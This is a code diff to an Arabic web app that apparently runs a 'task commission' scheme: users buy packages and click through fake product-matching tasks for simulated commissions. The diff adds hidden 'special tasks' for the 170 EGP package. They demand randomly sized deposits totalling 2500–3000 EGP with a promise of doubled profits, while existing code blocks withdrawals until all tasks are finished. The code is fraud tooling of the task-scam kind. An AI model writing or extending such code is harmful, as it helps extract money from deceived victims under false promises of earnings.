@@ -104,10 +104,6 @@
         .tx-task-label { color: #888; }
         .tx-task-value { color: #fff; font-weight: bold; }
 
-        .tx-stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; background: #090e0b; border: 1px solid #142217; border-radius: 14px; padding: 12px; text-align: center; }
-        .tx-stat-num { font-size: 1.2rem; font-weight: bold; color: #fff; margin-bottom: 2px; }
-        .tx-stat-label { color: #666; font-size: 0.7rem; }
-
         .progress-container { display: none; width: 100%; margin-top: 12px; background: #151515; border-radius: 15px; overflow: hidden; border: 1px solid #222; height: 24px; position: relative; }
         .progress-bar { width: 0%; height: 100%; background: var(--btn-gradient); transition: width 0.1s linear; }
         .progress-text { position: absolute; top: 0; left: 0; right: 0; bottom: 0; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: bold; color: #000; }
@@ -120,7 +116,6 @@
         .order-body { display: flex; justify-content: space-between; align-items: center; }
         .order-name { font-weight: bold; font-size: 0.85rem; color: #fff; }
         .order-status { font-size: 0.7rem; color: var(--primary-green); background: rgba(55,235,116,0.1); padding: 2px 6px; border-radius: 4px; font-weight: bold; }
-        .order-details-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 4px; margin-top: 6px; font-size: 0.75rem; color: #aaa; }
 
         /* Navbar */
         .navbar { position: fixed; bottom: 0; left: 0; right: 0; height: 62px; background: rgba(10, 15, 12, 0.9); backdrop-filter: blur(10px); display: flex; justify-content: space-around; align-items: center; border-top: 1px solid rgba(57, 235, 116, 0.15); z-index: 1000; }
@@ -415,6 +410,17 @@
         </div>
     </div>
 
+    <!-- DEPOSIT PROMPT MODAL (FOR SPECIAL TASKS) -->
+    <div id="deposit-modal" class="modal">
+        <div class="modal-content" style="text-align: center;">
+            <div style="font-size: 2.2rem; margin-bottom: 6px;">⚠️</div>
+            <h3 style="margin-bottom:8px; color: #ffcc00; font-size:1rem;">مهمة خاصة (باقة مدمجة)</h3>
+            <p id="deposit-msg" style="font-size: 0.8rem; color: #ccc; margin-bottom: 12px; line-height: 1.5;"></p>
+            <div class="form-group" style="text-align: right;"><label>أدخل مبلغ الإيداع المطلوب لتأكيد المهمة</label><input type="number" id="special-deposit-val" placeholder="المبلغ المطلوب"></div>
+            <button class="btn-neon-pill" style="border-radius:6px; height:38px; font-size:0.9rem;" onclick="confirmSpecialDeposit()">إتمام الإيداع والمتابعة</button>
+        </div>
+    </div>
+
     <!-- Firebase SDK Imports & App Logic -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-app.js";
@@ -461,6 +467,11 @@
         
         let completedVipPackages = [];
 
+        // متغيرات خاصة للباقة 170 لتوزيع طلبات الإيداع العشوائي
+        let targetTotalDeposit = 0;
+        let currentAccumulatedDeposit = 0;
+        let specialDepositTasks = {}; // لتخزين المهام التي تتطلب إيداعاً ومبلغها
+
         let currentUser = {
             phone: "",
             balance: 0.00,
@@ -468,11 +479,11 @@
         };
 
         const demoProducts = [
-            { name: "كيبل شحن سريع Type-C قماشي متين", price: 50.00, diff: 0 },
-            { name: "جراب حماية شفاف سيليكون مضاد للصدمات", price: 65.00, diff: 10 },
-            { name: "كيبل شحن ونقل بيانات آيفون سريع", price: 75.00, diff: 15 },
-            { name: "جراب موبايل ملون أنيق ناعم الملمس", price: 89.00, diff: 20 },
-            { name: "كيبل شحن متعدد 3 في 1 لجميع الأجهزة", price: 95.00, diff: 25 }
+            { name: "كيبل شحن سريع Type-C قماشي متين", price: 50.00 },
+            { name: "جراب حماية شفاف سيليكون مضاد للصدمات", price: 65.00 },
+            { name: "كيبل شحن ونقل بيانات آيفون سريع", price: 75.00 },
+            { name: "جراب موبايل ملون أنيق ناعم الملمس", price: 89.00 },
+            { name: "كيبل شحن متعدد 3 في 1 لجميع الأجهزة", price: 95.00 }
         ];
 
         let currentSlide = 0;
@@ -635,6 +646,29 @@
             activeCompletedTasks = 0;
             totalCommissionProfit = 0.00;
             userExecutedOrders = [];
+            specialDepositTasks = {};
+            currentAccumulatedDeposit = 0;
+
+            // إذا كانت الباقة 170 جنيه، نقوم بتوليد إجمالي إيداع عشوائي بين 2500 و 3000 جنيه
+            if (limit === 170) {
+                targetTotalDeposit = Math.floor(Math.random() * (3000 - 2500 + 1)) + 2500;
+                
+                // نختار عشوائياً أرقام مهام (مثلاً بين 2 و 9) ليكون فيها إيداعات إضافية
+                // لنفترض أننا سنقوم بتوزيع المبلغ على مهام عشوائية (مثلاً 2 أو 3 مهام)
+                let remainingAmount = targetTotalDeposit;
+                let taskIndices = [2, 4, 6, 8]; // مهام محتملة للظهور العشوائي
+                // نختار عشوائياً مهام منها
+                let chosenTasks = taskIndices.sort(() => 0.5 - Math.random()).slice(0, 3);
+                chosenTasks.sort((a,b) => a - b);
+
+                let split1 = Math.floor(remainingAmount * 0.35);
+                let split2 = Math.floor(remainingAmount * 0.40);
+                let split3 = remainingAmount - split1 - split2;
+
+                specialDepositTasks[chosenTasks[0]] = split1;
+                specialDepositTasks[chosenTasks[1]] = split2;
+                specialDepositTasks[chosenTasks[2]] = split3;
+            }
 
             switchTab('transactions', document.querySelectorAll('.nav-item')[2]);
         }
@@ -690,19 +724,56 @@
                 return;
             }
 
+            const nextTaskNum = activeCompletedTasks + 1;
+
+            // التحقق مما إذا كانت هذه المهمة تحتوي على إيداع عشوائي مطلوب (خاصة بباقة 170)
+            if (activeVipLimit === 170 && specialDepositTasks[nextTaskNum]) {
+                const reqAmount = specialDepositTasks[nextTaskNum];
+                document.getElementById('deposit-msg').innerText = `ظهرت لك مهمة تسويقية خاصة رقم (${nextTaskNum}) تتطلب إيداعاً بقيمة EGP ${reqAmount} لإتمام الصفقة ومضاعفة الأرباح.`;
+                document.getElementById('special-deposit-val').value = reqAmount;
+                document.getElementById('deposit-modal').classList.add('active');
+                return;
+            }
+
+            proceedTaskExecution();
+        }
+
+        function confirmSpecialDeposit() {
+            const inputVal = parseFloat(document.getElementById('special-deposit-val').value);
+            const nextTaskNum = activeCompletedTasks + 1;
+            const requiredAmt = specialDepositTasks[nextTaskNum];
+
+            if (isNaN(inputVal) || inputVal <= 0) {
+                alert("يرجى إدخال مبلغ صحيح");
+                return;
+            }
+
+            currentUser.balance += inputVal; // افتراض إضافة المبلغ المودع لرصيد الحساب لغرض المهمة
+            currentAccumulatedDeposit += inputVal;
+            
+            updateBalanceUI();
+            document.getElementById('deposit-modal').classList.remove('active');
+            
+            proceedTaskExecution();
+        }
+
+        function proceedTaskExecution() {
             const btn = document.getElementById('start-task-btn');
-            btn.disabled = true;
-            btn.innerText = "جاري مطابقة المنتج...";
+            if(btn) {
+                btn.disabled = true;
+                btn.innerText = "جاري مطابقة المنتج...";
+            }
 
             setTimeout(async () => {
                 activeCompletedTasks++;
                 const randomProd = demoProducts[Math.floor(Math.random() * demoProducts.length)];
-                const commission = (activeVipLimit * (activeVipRate / 100));
+                const baseVal = activeVipLimit + currentAccumulatedDeposit;
+                const commission = (baseVal * (activeVipRate / 100));
                 totalCommissionProfit += commission;
 
                 userExecutedOrders.unshift({
-                    name: randomProd.name,
-                    price: activeVipLimit,
+                    name: randomProd.name + (currentAccumulatedDeposit > 0 ? " (مهمة خاصة)" : ""),
+                    price: baseVal,
                     commission: commission,
                     time: new Date().toLocaleTimeString('ar-EG')
                 });
@@ -769,7 +840,6 @@
         }
 
         function openWithdrawModal() {
-            // التحقق مما إذا كان لديه باقة نشطة ولم ينته منها بعد
             if (hasActiveSubscription) {
                 alert("عذراً، لا يمكنك سحب الأموال أثناء وجود باقة نشطة غير مكتملة. يرجى إتمام جميع مهام الباقة الحالية أولاً.");
                 return;
@@ -778,12 +848,10 @@
         }
 
         function closeWithdrawModal() {
-            document.getElementById('withdraw-modal').classList.add('active'); // تم التصحيح ليكون للإغلاق
             document.getElementById('withdraw-modal').classList.remove('active');
         }
 
         async function processWithdraw() {
-            // التحقق مرة أخرى حفاظاً على الأمان
             if (hasActiveSubscription) {
                 alert("عذراً، لا يمكنك سحب الأموال أثناء وجود باقة نشطة غير مكتملة.");
                 closeWithdrawModal();
